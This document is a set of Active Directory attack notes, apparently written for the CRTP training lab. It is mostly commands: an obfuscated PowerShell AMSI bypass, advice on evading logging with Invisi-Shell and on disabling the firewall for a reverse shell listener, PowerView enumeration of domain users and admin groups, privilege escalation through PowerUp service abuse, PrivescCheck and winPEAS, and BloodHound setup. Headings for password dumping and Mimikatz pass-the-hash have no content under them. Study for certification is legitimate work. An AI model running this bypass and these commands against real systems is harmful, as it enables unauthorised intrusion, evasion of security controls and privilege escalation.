use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell and to avoid enhanced logging
use PowerView (https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) for enumerating the domain
remember to turn-off your firewall when your run listener for a reverse shell.

AMSI bypass:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GetvarI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"(( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```



---
Start :
```
Whoami /all
hostname
ipconfig.exe
```

Enum Domain :
```
Get-DomainComputer | select -ExpandProperty dnshostname
Get-ForestDomain -Verbose
Get-DomainTrust
```

Enum Users :
```
Get-DomainUser
Get-DomainUser -SPN
Get-DomainUser | select -ExpandProperty samaccountname

Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "studentx"}
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "RDPUsers"}

Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

Enum Groups 
```
Get-DomainGroup -Identity "Domain Admins"
```

---

Privilege Escalation

- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
```
. C:\AD\Tools\PowerUp.ps1

Invoke-AllChecks

Invoke-ServiceAbuse -Name 'vds' -UserName'tech\studentuser' -Verbose

whoami /all
```
- Privesc: https://github.com/itm4n/PrivescCheck
```
. C:\AD\Tools\PrivEscCheck.ps1

Invoke-PrivEscCheck

whoami /all
```
- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log

whoami /all
```

---

**Once we had administrator privileges, we ran PowerShell as an administrator and try to dump all Passwords**


---

**Once we had administrator privileges, we ran PowerShell as an administrator and try to use Bloodhound**
tool Path: 
```
.\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe
#>>>> or
Invoke-BloodHound -CollectionMethod all -ZipFilename CRTP.zip
```

BloodHound uses neo4j graph database, so that needs to be set up first.
1- Unzip the archive C:\AD\Tools\neo4j-community-4.1.1-windows.zip
2- in path : "C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin" , run this :
```
neo4j.bat install-service
Neo4j service installed
neo4j.bat start
```
3- Once the service is started, browse to http://localhost:7474
4- Enter the username: neo4j and password: neo4j. You need to enter a new password. Let's use BloodHound as the new password.
5- open BloodHound from C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64
write : 
bolt://localhost:7687
Username: neo4j
Password: BloodHound


---

**Once we had administrator privileges, we ran PowerShell as an administrator and try to use Mimikatz: Dump Hashes & Pass-the-Hash**
